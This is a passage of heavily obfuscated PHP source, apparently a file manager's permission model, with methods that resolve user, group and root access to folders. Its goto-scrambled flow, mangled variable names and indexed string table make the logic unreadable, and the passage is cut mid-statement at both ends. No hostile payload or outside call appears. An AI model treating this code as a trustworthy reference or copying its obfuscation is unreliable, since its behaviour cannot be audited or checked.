$EğéÆ¿³ƒà[1788] => isset($Bßê›©†Å[$EğéÆ¿³ƒà[1788]]) ? intval($Bßê›©†Å[$EğéÆ¿³ƒà[1788]]) : -1); } $Dì‡±¡ˆÁñ[] = array($EğéÆ¿³ƒà[387] => $eô®©°»µ[$EğéÆ¿³ƒà[387]], $EğéÆ¿³ƒà[389] => SourceModel::TYPE_USER, $EğéÆ¿³ƒà[474] => intval($E‰ó©–—‘Ï), $EğéÆ¿³ƒà[1787] => intval($fÜî´šÌ¢İ), $EğéÆ¿³ƒà[1788] => -1); $this->where(array($EğéÆ¿³ƒà[401] => $eô®©°»µ[$EğéÆ¿³ƒà[387]]))->delete(); $this->addAll($Dì‡±¡ˆÁñ); } return !0; } public function get($EˆÌƒÚ´) { $A×“Ô„æÜÁ = $this->getSourceList(array($EˆÌƒÚ´), !0); return $A×“Ô„æÜÁ[0]; } public function getSourceList($FöˆŞ¼™², $Fç×¡ºÕå = false, $Fã‹…Öº‚ê = false) { goto C·•‘èÊ±™; CôéÂ£Ã»ï: $aíªÍïŠß = $this->sourceAuthSelect($däÀ†); $Bßé—Š¸ = array(); foreach ($däÀ† as $A¬÷ô…²¾) { if (isset($aíªÍïŠß[$A¬÷ô…²¾])) { $Bßé—Š¸[$A¬÷ô…²¾] = $aíªÍïŠß[$A¬÷ô…²¾]; } } goto A‹åÜîÆÉ; EŞ¹İ÷ùæ•: foreach ($Fç×¡ºÕå as $D†ö¢±ê‹ => $cë‚²ØÁé) { $Dä®‘è¦É‹ = $fÛ™—ÖÄšÇ->parentLevelArray($cë‚²ØÁé[$FõáÈ¤õ§[477]]); $däÀ† = array_merge($däÀ†, array($D†ö¢±ê‹), array_reverse($Dä®‘è¦É‹)); } $däÀ† = array_values(array_unique($däÀ†)); if (!$däÀ†) { return array(); } goto CôéÂ£Ã»ï; bÒÈ°“î…: if (!$Fç×¡ºÕå && count($FöˆŞ¼™²) == 1) { $Fç×¡ºÕå = array(); $Fç×¡ºÕå[$FöˆŞ¼™²[0]] = $fÛ™—ÖÄšÇ->sourceInfo($FöˆŞ¼™²[0]); } if (!$Fç×¡ºÕå) { $eß©‡‘Ş•º = array($FõáÈ¤õ§[401] => array($FõáÈ¤õ§[402], $FöˆŞ¼™²)); $Fç×¡ºÕå = $fÛ™—ÖÄšÇ->field($FõáÈ¤õ§[1814])->where($eß©‡‘Ş•º)->select(); $Fç×¡ºÕå = array_to_keyvalue($Fç×¡ºÕå, $FõáÈ¤õ§[387]); } $däÀ† = $FöˆŞ¼™²; goto EŞ¹İ÷ùæ•; A‹åÜîÆÉ: $fÆñğƒ§Ë¨ = $this->userIsRoot($Fã‹…Öº‚ê); $a•›óÜĞù¼ = AuthModel::authAll(); $CÇ¤²’¥ä… = array($FõáÈ¤õ§[395] => $a•›óÜĞù¼, $FõáÈ¤õ§[1815] => array($FõáÈ¤õ§[403] => 0, $FõáÈ¤õ§[1644] => $a•›óÜĞù¼, $FõáÈ¤õ§[404] => LNG($FõáÈ¤õ§[1816]), $FõáÈ¤õ§[1659] => $FõáÈ¤õ§[1817])); goto dˆõ‰Åè‰à; C·•‘èÊ±™: $FõáÈ¤õ§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$FöˆŞ¼™²) { return array(); } $fÛ™—ÖÄšÇ = Model($FõáÈ¤õ§[1154]); goto bÒÈ°“î…; dˆõ‰Åè‰à: $a÷Ùí‘™Å  = array(); foreach ($Fç×¡ºÕå as $A¬÷ô…²¾ => $dÑáŞŒÎ’°) { if ($fÆñğƒ§Ë¨) { $a÷Ùí‘™Å [$A¬÷ô…²¾] = $CÇ¤²’¥ä…; continue; } $a÷Ùí‘™Å [$A¬÷ô…²¾] = $this->makeSourceAuth($dÑáŞŒÎ’°, $Bßé—Š¸, $Fã‹…Öº‚ê); } return $a÷Ùí‘™Å ; goto AâÀ‹¤ºÈà; AâÀ‹¤ºÈà: } public function authDeepCheck($DÂ²ô¢¬ì¹, $bƒÖ •’Ã¹ = false) { goto ašëï™ ÑÒ; BÏ›…»°: if (!in_array($DÂ²ô¢¬ì¹, $c¡Š¼ÑÄ³á[$A§å§ˆ†Óƒ[1818]])) { return !1; } $DÜß÷ã¶È = array(); foreach ($c¡Š¼ÑÄ³á[$A§å§ˆ†Óƒ[1819]] as $BÔéĞåƒ¸Æ => $Aò† Íºà“) { if (!in_array($DÂ²ô¢¬ì¹, $Aò† Íºà“)) { continue; } $DÜß÷ã¶È[] = $BÔéĞåƒ¸Æ; } goto EÃšóÓ Şƒ; ašëï™ ÑÒ: $A§å§ˆ†Óƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bƒÖ •’Ã¹ = $bƒÖ •’Ã¹ ? $bƒÖ •’Ã¹ : USER_ID; $c¡Š¼ÑÄ³á = $this->makeAuthDeep($bƒÖ •’Ã¹); goto BÏ›…»°; EÃšóÓ Şƒ: if (!$DÜß÷ã¶È) { return !1; } $fä¥òš«‘¸ = $DÜß÷ã¶È ? $DÜß÷ã¶È[0] : $DÂ²ô¢¬ì¹; return array($A§å§ˆ†Óƒ[395] => -1, $A§å§ˆ†Óƒ[435] => array($A§å§ˆ†Óƒ[403] => $A§å§ˆ†Óƒ[1036], $A§å§ˆ†Óƒ[1644] => $A§å§ˆ†Óƒ[486], $A§å§ˆ†Óƒ[404] => LNG($A§å§ˆ†Óƒ[1820]), $A§å§ˆ†Óƒ[1659] => $A§å§ˆ†Óƒ[1821]), $A§å§ˆ†Óƒ[1822] => LNG($A§å§ˆ†Óƒ[1823]), $A§å§ˆ†Óƒ[1824] => $this->sourceAuthInfo($fä¥òš«‘¸)); goto eâÙ‚‰òÙ”; eâÙ‚‰òÙ”: } protected function makeAuthDeep($FÏí¦‡…Ò = false) { goto BºÍá¶®¿²; fÒ¤§††ß: if ($FŠ×÷ë´ˆÍ) { $dÀ“½†å¡“ = array(array($DÁÛ­ÜšÑé[389] => SourceModel::TYPE_USER, $DÁÛ­ÜšÑé[474] => $FÏí¦‡…Ò), array($DÁÛ­ÜšÑé[389] => SourceModel::TYPE_GROUP, $DÁÛ­ÜšÑé[474] => array($DÁÛ­ÜšÑé[402], $FŠ×÷ë´ˆÍ)), $DÁÛ­ÜšÑé[909] => $DÁÛ­ÜšÑé[1727]); } $f¼¹‚œÊ¹ = $this->field($DÁÛ­ÜšÑé[1826])->where($dÀ“½†å¡“)->select(); $e­ø©ÎãÊ = array(); goto AÜøÁç²Ù¼; C®ê‰í¸Êã: foreach ($fÍÙ¸Ê¶Á® as $CÚäñ°¾®õ) { $CÁŒôßäºº = $d­„º¾­š->getInfo($CÚäñ°¾®õ); $CÕŠ†êêÏ[] = $CÁŒôßäºº[$DÁÛ­ÜšÑé[84]][$DÁÛ­ÜšÑé[387]]; $cë÷Ú²­Óá[$CÚäñ°¾®õ] = $CÁŒôßäºº[$DÁÛ­ÜšÑé[84]][$DÁÛ­ÜšÑé[387]]; $fç†åÆ†“[$CÚäñ°¾®õ] = $FŸ‰‡¯ƒô¢->parentLevelArray($CÁŒôßäºº[$DÁÛ­ÜšÑé[477]]); } foreach ($E¨Ì¬¶Œ‘ as $Eõˆ½â³Ñ® => $CÛ¤š¾‘è¨) { $bÄŞõ©ØŒ = $E…º¶½¹Ç¾[$Eõˆ½â³Ñ®]; if (!$bÄŞõ©ØŒ || !$cë÷Ú²­Óá[$bÄŞõ©ØŒ]) { continue; } $AÅæØ¾öõÚ = array(); foreach ($fç†åÆ†“[$bÄŞõ©ØŒ] as $CÚäñ°¾®õ) { $AÅæØ¾öõÚ[] = $cë÷Ú²­Óá[$CÚäñ°¾®õ]; } $E¨Ì¬¶Œ‘[$Eõˆ½â³Ñ®] = array_merge($AÅæØ¾öõÚ, $CÛ¤š¾‘è¨); } $CÕŠ†êêÏ = array_values(array_unique($CÕŠ†êêÏ)); goto a”ê®‚æ·İ; f¦ÖèªŒ: $fç†åÆ†“ = array(); if ($e­ø©ÎãÊ) { $A½áÂ”‘İï = $FŸ‰‡¯ƒô¢->where(array($DÁÛ­ÜšÑé[387] => array($DÁÛ­ÜšÑé[402], $e­ø©ÎãÊ)))->select(); foreach ($A½áÂ”‘İï as $bÔéÏ˜²Ã™) { $Aíê³É± = $FŸ‰‡¯ƒô¢->parentLevelArray($bÔéÏ˜²Ã™[$DÁÛ­ÜšÑé[477]]); $CÕŠ†êêÏ = array_merge($CÕŠ†êêÏ, $Aíê³É±); $fÍÙ¸Ê¶Á®[] = $bÔéÏ˜²Ã™[$DÁÛ­ÜšÑé[474]]; $E¨Ì¬¶Œ‘[$bÔéÏ˜²Ã™[$DÁÛ­ÜšÑé[387]]] = $Aíê³É±; $E…º¶½¹Ç¾[$bÔéÏ˜²Ã™[$DÁÛ­ÜšÑé[387]]] = $bÔéÏ˜²Ã™[$DÁÛ­ÜšÑé[474]]; } } $fÍÙ¸Ê¶Á® = array_values(array_unique($fÍÙ¸Ê¶Á®)); goto e±††É°åÛ; E½Ù˜¹ô˜ù: foreach ($Aä†Ïò —Ş as $c¼™Å¿ÓÊ§) { if ($c¼™Å¿ÓÊ§[$DÁÛ­ÜšÑé[394]] == 0 && $c¼™Å¿ÓÊ§[$DÁÛ­ÜšÑé[1660]] == $DÁÛ­ÜšÑé[86]) { $câ¢ßÚ‡½â[] = $c¼™Å¿ÓÊ§[$DÁÛ­ÜšÑé[385]]; } } $FŠ×÷ë´ˆÍ = $this->userGroupParents($FÏí¦‡…Ò); $dÀ“½†å¡“ = array($DÁÛ­ÜšÑé[389] => SourceModel::TYPE_USER, $DÁÛ­ÜšÑé[474] => $FÏí¦‡…Ò); goto fÒ¤§††ß; a¡®Ïµ‰•“: $fÍÙ¸Ê¶Á® = $FŠ×÷ë´ˆÍ; $FŸ‰‡¯ƒô¢ = Model($DÁÛ­ÜšÑé[1154]); $d­„º¾­š = Model($DÁÛ­ÜšÑé[476]); goto dÒâ²Ã¯¶; d‹„›ë©: if (isset($a¯»í‰®…Ù[$FÏí¦‡…Ò])) { return $a¯»í‰®…Ù[$FÏí¦‡…Ò]; } $Aä†Ïò —Ş = Model($DÁÛ­ÜšÑé[1825])->listData(); $câ¢ßÚ‡½â = array(); goto E½Ù˜¹ô˜ù; dÒâ²Ã¯¶: $E¨Ì¬¶Œ‘ = array(); $E…º¶½¹Ç¾ = array(); $cë÷Ú²­Óá = array(); goto f¦ÖèªŒ; a”ê®‚æ·İ: $bØ×áÙ = array($DÁÛ­ÜšÑé[1818] => $CÕŠ†êêÏ, $DÁÛ­ÜšÑé[1819] => $E¨Ì¬¶Œ‘); $a¯»í‰®…Ù[$FÏí¦‡…Ò] = $bØ×áÙ; return $bØ×áÙ; goto E–¶ñÌÓÜ; BºÍá¶®¿²: $DÁÛ­ÜšÑé =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $a¯»í‰®…Ù = array(); $FÏí¦‡…Ò = $FÏí¦‡…Ò ? $FÏí¦‡…Ò : USER_ID; goto d‹„›ë©; AÜøÁç²Ù¼: $a¥Ÿéª÷ì = array_to_keyvalue_group($f¼¹‚œÊ¹, $DÁÛ­ÜšÑé[387]); foreach ($a¥Ÿéª÷ì as $c•“í„Õè  => $fñˆ•ªˆ˜ä) { $D©—ÊñÊ“ = $this->authArrayCheck($fñˆ•ªˆ˜ä, $FÏí¦‡…Ò); if ($D©—ÊñÊ“[$DÁÛ­ÜšÑé[395]] > 0) { $e­ø©ÎãÊ[] = $c•“í„Õè  . $DÁÛ­ÜšÑé[33]; } } $CÕŠ†êêÏ = array(); goto a¡®Ïµ‰•“; e±††É°åÛ: $CŞäÜÖš‹¶ = $fÍÙ¸Ê¶Á®; foreach ($CŞäÜÖš‹¶ as $CÚäñ°¾®õ) { $CÁŒôßäºº = $d­„º¾­š->getInfo($CÚäñ°¾®õ); $Aíê³É± = $FŸ‰‡¯ƒô¢->parentLevelArray($CÁŒôßäºº[$DÁÛ­ÜšÑé[477]]); $fÍÙ¸Ê¶Á® = array_merge($fÍÙ¸Ê¶Á®, $Aíê³É±); } $fÍÙ¸Ê¶Á® = array_values(array_unique($fÍÙ¸Ê¶Á®)); goto C®ê‰í¸Êã; E–¶ñÌÓÜ: } private function makeSourceAuth($Eˆ¤ô¬·°, $c³Çˆ±ÉÎÀ, $dêî¥Ÿ¦º¹ = false) { goto aç›¢å¨ˆ‚; c§ñòåÆ–: if (!$A¥ŞäÊâÍ) { $F‘‰ïéõ = Model($BÜ«‘ˆ‘‰[476])->getInfo($aƒÃÄÄ—ÎÌ); $a˜•¢ÓÑ‚ = explode($BÜ«‘ˆ‘‰[47], trim($F‘‰ïéõ[$BÜ«‘ˆ‘‰[477]], $BÜ«‘ˆ‘‰[47])); $a˜•¢ÓÑ‚ = array_reverse($a˜•¢ÓÑ‚); foreach ($a˜•¢ÓÑ‚ as $eº™½ÂÇ÷Å) { if ($eº™½ÂÇ÷Å == $BÜ«‘ˆ‘‰[486] || $eº™½ÂÇ÷Å == $Fî£½ØçÜä) { continue; } $Eìâ²É•¶ = $this->groupRootAuth($eº™½ÂÇ÷Å, $dêî¥Ÿ¦º¹); if (!$Eìâ²É•¶) { continue; } $A¥ŞäÊâÍ = $this->groupAuthInfo($Eìâ²É•¶, $eº™½ÂÇ÷Å); break; } } if (!$A¥ŞäÊâÍ || $A¥ŞäÊâÍ[$BÜ«‘ˆ‘‰[395]] <= 0) { $E™ÜÌ‚µì = $this->authDeepCheck($Eˆ¤ô¬·°[$BÜ«‘ˆ‘‰[387]], $dêî¥Ÿ¦º¹); if ($E™ÜÌ‚µì) { $A¥ŞäÊâÍ = $E™ÜÌ‚µì; } } return $A¥ŞäÊâÍ; goto eß„ĞÉÒîË; aç›¢å¨ˆ‚: $BÜ«‘ˆ‘‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Fî£½ØçÜä = $BÜ«‘ˆ‘‰[86]; $aƒÃÄÄ—ÎÌ = $Eˆ¤ô¬·°[$BÜ«‘ˆ‘‰[474]]; goto dñ¦Œá·Û; BÎãñÙİ: $A¿â¨‘Ü¾ = Model($BÜ«‘ˆ‘‰[1154])->parentLevelArray($Eˆ¤ô¬·°[$BÜ«‘ˆ‘‰[477]]); $A¿â¨‘Ü¾ = array_merge(array($Eˆ¤ô¬·°[$BÜ«‘ˆ‘‰[387]]), array_reverse($A¿â¨‘Ü¾)); $A¥ŞäÊâÍ = !1; goto cÉ‰µ‡“Øğ; dñ¦Œá·Û: $FğùŒŠ³ØÒ = $Eˆ¤ô¬·°[$BÜ«‘ˆ‘‰[389]] == SourceModel::TYPE_GROUP; $D—Ğ‘œ°¼Ÿ = $FğùŒŠ³ØÒ ? $this->groupRootAuth($aƒÃÄÄ—ÎÌ, $dêî¥Ÿ¦º¹) : !1; if ($D—Ğ‘œ°¼Ÿ && Model($BÜ«‘ˆ‘‰[1806])->authCheckAction($D—Ğ‘œ°¼Ÿ[$BÜ«‘ˆ‘‰[394]], $BÜ«‘ˆ‘‰[1658])) { return $this->groupAuthInfo($D—Ğ‘œ°¼Ÿ, $aƒÃÄÄ—ÎÌ); } goto BÎãñÙİ; cÉ‰µ‡“Øğ: foreach ($A¿â¨‘Ü¾ as $Eøö¯ò’) { if (!isset($c³Çˆ±ÉÎÀ[$Eøö¯ò’])) { continue; } $D©äÃ¤êá¢ = $this->authMake($c³Çˆ±ÉÎÀ[$Eøö¯ò’], $dêî¥Ÿ¦º¹); if ($D©äÃ¤êá¢[$BÜ«‘ˆ‘‰[435]]) { $A¥ŞäÊâÍ = $D©äÃ¤êá¢; break; } } if (!$FğùŒŠ³ØÒ) { return $A¥ŞäÊâÍ; } if (!$A¥ŞäÊâÍ && $D—Ğ‘œ°¼Ÿ) { $A¥ŞäÊâÍ = $this->groupAuthInfo($D—Ğ‘œ°¼Ÿ, $aƒÃÄÄ—ÎÌ); } goto c§ñòåÆ–; eß„ĞÉÒîË: } private function userIsRoot($D™ª‘Éºª§ = false) { $F¶êµ… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$D™ª‘Éºª§ && _get($GLOBALS, $F¶êµ…[475])) { return !0; } $C²«’Ë£ÚŒ = Model($F¶êµ…[495])->getInfo($D™ª‘Éºª§); $e¹åŞÑ‚Æ = Model($F¶êµ…[1827])->listData($C²«’Ë£ÚŒ[$F¶êµ…[1363]]); if ($e¹åŞÑ‚Æ && $e¹åŞÑ‚Æ[$F¶êµ…[1233]][$F¶êµ…[1828]] == 1) { return !0; } return !1; } private function sourceAuthInfo($B¿›´õÊÙ•) { goto c¶•ÓÈÔø; FìÕ¼øÆ : if (!$dÉ­ëÆÃóĞ) { return !1; } $e×øíÒÎùÇ->groupPathDisplay($dÉ­ëÆÃóĞ); $B¡°ÚÙˆµõ = array($dÉ­ëÆÃóĞ); goto EŠÙ×í©£å; Dä“£•Øª÷: if (isset($dÉ­ëÆÃóĞ[$CéºŠÈñŸ[482]])) { $aé†—†åİ¶ = explode($CéºŠÈñŸ[8], trim($dÉ­ëÆÃóĞ[$CéºŠÈñŸ[484]], $CéºŠÈñŸ[8])); array_shift($aé†—†åİ¶); $a¿¯…•‘ÛÜ = $dÉ­ëÆÃóĞ[$CéºŠÈñŸ[480]] . $CéºŠÈñŸ[1829] . implode($CéºŠÈñŸ[8], $aé†—†åİ¶); } return array($CéºŠÈñŸ[404] => $dÉ­ëÆÃóĞ[$CéºŠÈñŸ[28]], $CéºŠÈñŸ[75] => KodIO::make($dÉ­ëÆÃóĞ[$CéºŠÈñŸ[387]]), $CéºŠÈñŸ[1830] => $a¿¯…•‘ÛÜ); goto A¤Ã¯¡ÆÍ‹; EŠÙ×í©£å: $B¡°ÚÙˆµõ = $e×øíÒÎùÇ->_listAppendPath($B¡°ÚÙˆµõ); $dÉ­ëÆÃóĞ = $B¡°ÚÙˆµõ[0]; $a¿¯…•‘ÛÜ = $dÉ­ëÆÃóĞ[$CéºŠÈñŸ[484]]; goto Dä“£•Øª÷; c¶•ÓÈÔø: $CéºŠÈñŸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e×øíÒÎùÇ = Model($CéºŠÈñŸ[1154]); $dÉ­ëÆÃóĞ = $e×øíÒÎùÇ->sourceInfo($B¿›´õÊÙ•); goto FìÕ¼øÆ ; A¤Ã¯¡ÆÍ‹: } private function groupAuthInfo($CÄ²¾â”ŠÎ, $EË§öİ‡…º) { $b–’÷ãáóÇ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¬ë ´ëƒù = Model($b–’÷ãáóÇ[476])->getInfo($EË§öİ‡…º); return array($b–’÷ãáóÇ[1831] => intval($CÄ²¾â”ŠÎ[$b–’÷ãáóÇ[394]]), $b–’÷ãáóÇ[1815] => $CÄ²¾â”ŠÎ, $b–’÷ãáóÇ[1832] => LNG($b–’÷ãáóÇ[1833]), $b–’÷ãáóÇ[1824] => array($b–’÷ãáóÇ[404] => $E¬ë ´ëƒù[$b–’÷ãáóÇ[28]], $b–’÷ãáóÇ[75] => KodIO::make($E¬ë ´ëƒù[$b–’÷ãáóÇ[84]][$b–’÷ãáóÇ[387]]), $b–’÷ãáóÇ[1830] => $E¬ë ´ëƒù[$b–’÷ãáóÇ[481]])); } protected function groupRootAuth($fÛ­›‹ÇÆÇ, $CíÈÅÀ‘ˆÑ = false) { goto Eæ‹™ñÂÛ; bÒÁÉ×¸Çñ: $F…£ÊÂ˜†¨ = $this->userGroupList($CíÈÅÀ‘ˆÑ); $c¦Ÿ¥§æ”½ = isset($F…£ÊÂ˜†¨[$fÛ­›‹ÇÆÇ]) ? $F…£ÊÂ˜†¨[$fÛ­›‹ÇÆÇ][$Dİáâ‰ßÀ¯[394]] : !1; if ($c¦Ÿ¥§æ”½ && Model($Dİáâ‰ßÀ¯[1806])->authCheckAction($c¦Ÿ¥§æ”½[$Dİáâ‰ßÀ¯[394]], $Dİáâ‰ßÀ¯[1658])) { $E©ª²Ú‹ë…[$bÛ³ê”ô‡õ] = $c¦Ÿ¥§æ”½; return $c¦Ÿ¥§æ”½; } goto fÂãÛÌÊ«ó; E‘Óî—‡ßÖ: $E©ª²Ú‹ë…[$bÛ³ê”ô‡õ] = $a› ¼ Ù³ ? $a› ¼ Ù³ : $c¦Ÿ¥§æ”½; return $E©ª²Ú‹ë…[$bÛ³ê”ô‡õ]; goto D¡Óà‹Õ; e‘¤””˜: static $E©ª²Ú‹ë… = array(); if (isset($E©ª²Ú‹ë…[$bÛ³ê”ô‡õ])) { return $E©ª²Ú‹ë…[$bÛ³ê”ô‡õ]; } $aƒ§×“óœ = Model($Dİáâ‰ßÀ¯[476])->getInfo($fÛ­›‹ÇÆÇ); goto bÒÁÉ×¸Çñ; fÂãÛÌÊ«ó: $dŞó¾¸Í‚œ = $this->sourceAuthSelect($aƒ§×“óœ[$Dİáâ‰ßÀ¯[84]][$Dİáâ‰ßÀ¯[387]]); $BÇõÂŠ = $dŞó¾¸Í‚œ ? $this->authMake($dŞó¾¸Í‚œ, $CíÈÅÀ‘ˆÑ) : !1; $a› ¼ Ù³ = $BÇõÂŠ ? $BÇõÂŠ[$Dİáâ‰ßÀ¯[435]] : !1; goto E‘Óî—‡ßÖ; Eæ‹™ñÂÛ: $Dİáâ‰ßÀ¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CíÈÅÀ‘ˆÑ = $CíÈÅÀ‘ˆÑ ? $CíÈÅÀ‘ˆÑ : USER_ID; $bÛ³ê”ô‡õ = $CíÈÅÀ‘ˆÑ . $Dİáâ‰ßÀ¯[1834] . $fÛ­›‹ÇÆÇ; goto e‘¤””˜; D¡Óà‹Õ: } public function authOwnerApply($C›»•öâç§) { goto E­æ¥‹ÖßĞ; E­æ¥‹ÖßĞ: $cºŠØ¹÷İ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($C›»•öâç§[$cºŠØ¹÷İ[394]]) || isset($C›»•öâç§[$cºŠØ¹÷İ[1835]]) && $C›»•öâç§[$cºŠØ¹÷İ[1835]]) { return $C›»•öâç§; } if (AuthModel::authCheckRoot($C›»•öâç§[$cºŠØ¹÷İ[394]][$cºŠØ¹÷İ[395]])) { return $C›»•öâç§; } goto AÒ¼¢¢ùƒ; AÒ¼¢¢ùƒ: $b— êæç©± = Model($cºŠØ¹÷İ[1154])->parentLevelArray($C›»•öâç§[$cºŠØ¹÷İ[477]]); $b— êæç©± = array_merge(array($C›»•öâç§[$cºŠØ¹÷İ[387]]), array_reverse($b— êæç©±)); $FÇŞÙ„‰Ÿà = $this->sourceAuthSelect($b— êæç©±); goto cÍÏ²“¹˜í; AôòåŞÚš: if (count($fÌ˜æ´…Ÿ›) == 0) { $fÌ˜æ´…Ÿ› = $this->authFolderOwnerGroup($C›»•öâç§[$cºŠØ¹÷İ[474]]); } $fÌ˜æ´…Ÿ› = array_unique($fÌ˜æ´…Ÿ›); if (AuthModel::authCheckRoot($C›»•öâç§[$cºŠØ¹÷İ[394]][$cºŠØ¹÷İ[395]])) { $fÌ˜æ´…Ÿ›[] = USER_ID; } goto b¡ ãĞêÅ; cÍÏ²“¹˜í: $f…·³¼’“Ù = array(); $fÌ˜æ´…Ÿ› = array(); foreach ($FÇŞÙ„‰Ÿà as $fÆ¬Ğ„½†Ğ => $bƒæƒÑˆÙÑ) { $d°±ÇªÛ = $this->authFolderOwnerUser($bƒæƒÑˆÙÑ); $f…·³¼’“Ù[$fÆ¬Ğ„½†Ğ] = $d°±ÇªÛ; $fÌ˜æ´…Ÿ› = array_merge($fÌ˜æ´…Ÿ›, $d°±ÇªÛ[$cºŠØ¹÷İ[551]]); if ($d°±ÇªÛ[$cºŠØ¹÷İ[1836]]) { break; } } goto AôòåŞÚš; b¡ ãĞêÅ: $C›»•öâç§[$cºŠØ¹÷İ[394]][$cºŠØ¹÷İ[1837]] = Model($cºŠØ¹÷İ[492])->userListInfo($fÌ˜æ´…Ÿ›); return $C›»•öâç§; goto eêóëöˆ’; eêóëöˆ’: } private function authFolderOwnerGroup($A¦ÊÑÛˆ½÷) { $D©Ñ“ƒÁÌ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BòÀİ·è¥ = Model($D©Ñ“ƒÁÌ[1721])->where(array($D©Ñ“ƒÁÌ[1638] => $A¦ÊÑÛˆ½÷))->select(); $CÏ—ƒ—ŞÀ = array(); if (!$BòÀİ·è¥) { return $CÏ—ƒ—ŞÀ; } foreach ($BòÀİ·è¥ as $c˜ĞÎğãÕÃ) { $cÎÃî = $this->authInfo($c˜ĞÎğãÕÃ); if (AuthModel::authCheckRoot($cÎÃî[$D©Ñ“ƒÁÌ[394]])) { $CÏ—ƒ—ŞÀ[] = $c˜ĞÎğãÕÃ[$D©Ñ“ƒÁÌ[1479]]; } } return $CÏ—ƒ—ŞÀ; } private function authFolderOwnerUser($A¼ÅóáµÙâ) { $C¤§ÊŒç“É =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bçä³áß² = array(); $B†˜ ¦ñâ = !1; foreach ($A¼ÅóáµÙâ as $C»Ñ’Ë˜¢ó) { $C§‡Ü¡÷ğë = $this->authInfo($C»Ñ’Ë˜¢ó); if ($C»Ñ’Ë˜¢ó[$C¤§ÊŒç“É[474]] == $C¤§ÊŒç“É[486]) { $B†˜ ¦ñâ = !0; } if ($C»Ñ’Ë˜¢ó[$C¤§ÊŒç“É[389]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($C§‡Ü¡÷ğë[$C¤§ÊŒç“É[394]])) { $bçä³áß²[] = $C»Ñ’Ë˜¢ó[$C¤§ÊŒç“É[474]]; } } } return array($C¤§ÊŒç“É[551] => $bçä³áß², $C¤§ÊŒç“É[1836] => $B†˜ ¦ñâ); } public function authMake($f¿åšá¿İ, $f…¹öàˆ‰ = false) { $CÍ‘µ¬¹† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Cé¸°Û•Ü  = $this->authArrayCheck($f¿åšá¿İ, $f…¹öàˆ‰); if ($Cé¸°Û•Ü [$CÍ‘µ¬¹†[1838]]) { $Cé¸°Û•Ü [$CÍ‘µ¬¹†[1838]] = $this->sourceAuthInfo($Cé¸°Û•Ü [$CÍ‘µ¬¹†[1838]]); } return $Cé¸°Û•Ü ; } public function authArrayCheck($bÉØÑ“äê, $E²­ïŸ˜Â = false) { goto eËÆ†šƒ; DÔ„İà¡: foreach ($bÉØÑ“äê as $f¯¡ÌÎŞ´) { $aå÷šä¬¡¾ = $this->authInfo($f¯¡ÌÎŞ´); if (!$aå÷šä¬¡¾) { continue; } $CöÍŞùåòØ = $f¯¡ÌÎŞ´[$EÇÜêñ½ˆğ[474]]; $BµµëÛçïõ = intval($aå÷šä¬¡¾[$EÇÜêñ½ˆğ[394]]); if ($f¯¡ÌÎŞ´[$EÇÜêñ½ˆğ[389]] == SourceModel::TYPE_USER && $CöÍŞùåòØ == $E²­ïŸ˜Â) { $fÂ£ÑÉ—ï = !0; $D¨†Ö÷äÎ¨ = $aå÷šä¬¡¾; $b—Ü†ã˜èè = $BµµëÛçïõ; } else { if ($f¯¡ÌÎŞ´[$EÇÜêñ½ˆğ[389]] == SourceModel::TYPE_GROUP && $this->groupContainUser($CöÍŞùåòØ, $E²­ïŸ˜Â)) { $Fªµ‚Î‚˜ = !0; $e‚½Üˆ…ö = $this->groupStepToUserGroup($CöÍŞùåòØ, $E²­ïŸ˜Â); if ($e‚½Üˆ…ö < $dˆÑ‡Ëã¢³) { $dˆÑ‡Ëã¢³ = $e‚½Üˆ…ö; $bÂ·¼–î• = $BµµëÛçïõ; $aÒÒ¸©Œºî = $aå÷šä¬¡¾; $b£†ÀÄµøŒ = $CöÍŞùåòØ; } if ($e‚½Üˆ…ö == $dˆÑ‡Ëã¢³ && $BµµëÛçïõ >= $bÂ·¼–î•) { $bÂ·¼–î• = $BµµëÛçïõ; $aÒÒ¸©Œºî = $aå÷šä¬¡¾; $b£†ÀÄµøŒ = $CöÍŞùåòØ; } } else { if ($CöÍŞùåòØ == $EÇÜêñ½ˆğ[486]) { $B‘ò§ÜœÆİ = !0; $b±½÷îñÕ = $aå÷šä¬¡¾; $fÔÙ…¡Ìñ‘ = $BµµëÛçïõ; } } } } if ($fÂ£ÑÉ—ï) { $c³‰Ì¾Úˆ = $b—Ü†ã˜èè; $aå÷šä¬¡¾ = $D¨†Ö÷äÎ¨; $aÆè£´Éø = LNG($EÇÜêñ½ˆğ[1839]); } else { if ($Fªµ‚Î‚˜) { $c³‰Ì¾Úˆ = $bÂ·¼–î•; $aå÷šä¬¡¾ = $aÒÒ¸©Œºî; $b‚‰¥¡ÜøÄ = Model($EÇÜêñ½ˆğ[476])->getInfo($b£†ÀÄµøŒ); $aÆè£´Éø = $EÇÜêñ½ˆğ[159] . $b‚‰¥¡ÜøÄ[$EÇÜêñ½ˆğ[481]] . $EÇÜêñ½ˆğ[1840] . LNG($EÇÜêñ½ˆğ[1841]); } else { if ($B‘ò§ÜœÆİ) { $c³‰Ì¾Úˆ = $fÔÙ…¡Ìñ‘; $aå÷šä¬¡¾ = $b±½÷îñÕ; $aÆè£´Éø = LNG($EÇÜêñ½ˆğ[1812]); } else { $c³‰Ì¾Úˆ = 0; $aå÷šä¬¡¾ = !1; $aÆè£´Éø = $EÇÜêñ½ˆğ[33]; } } } $a¹ÂÂã†©¤ = array($EÇÜêñ½ˆğ[1831] => intval($c³‰Ì¾Úˆ), $EÇÜêñ½ˆğ[1815] => $aå÷šä¬¡¾, $EÇÜêñ½ˆğ[1832] => $aÆè£´Éø, $EÇÜêñ½ˆğ[1824] => $f¯¡ÌÎŞ´[$EÇÜêñ½ˆğ[387]]); goto e‹åÇÅ´Í; E¢ßÔ©òé¿: $fÂ£ÑÉ—ï = 0; $b—Ü†ã˜èè = 0; 